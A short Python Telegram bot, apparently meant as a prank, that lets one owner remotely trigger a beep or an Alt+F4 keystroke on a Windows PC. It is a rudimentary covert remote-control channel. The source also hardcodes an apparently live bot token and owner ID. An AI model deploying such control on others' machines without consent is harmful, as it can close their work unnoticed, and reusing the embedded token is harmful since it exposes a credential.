import winsound
import pyautogui
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

TOKEN = "8931478982:AAG0VxaPy1W9-ZDZb8sRlc2OFuFGr29ik8M"
OWNER_ID = 5411414588


def allowed(update):
    return update.effective_user and update.effective_user.id == OWNER_ID


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if allowed(update):
        await update.message.reply_text(
            "Пранк-ПК подключён!\n\n"
            "/sound — звук\n"
            "/altf4 — Alt+F4\n"
            "/stop — проверить связь"
        )


async def sound(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if allowed(update):
        winsound.MessageBeep()
        await update.message.reply_text("Бип!")


async def altf4(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if allowed(update):
        pyautogui.hotkey("alt", "f4")
        await update.message.reply_text("Alt+F4 выполнен")


async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if allowed(update):
        await update.message.reply_text("ПК на связи")


def main():
    app = Application.builder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("sound", sound))
    app.add_handler(CommandHandler("altf4", altf4))
    app.add_handler(CommandHandler("stop", stop))

    app.run_polling()


if __name__ == "__main__":
    main()	
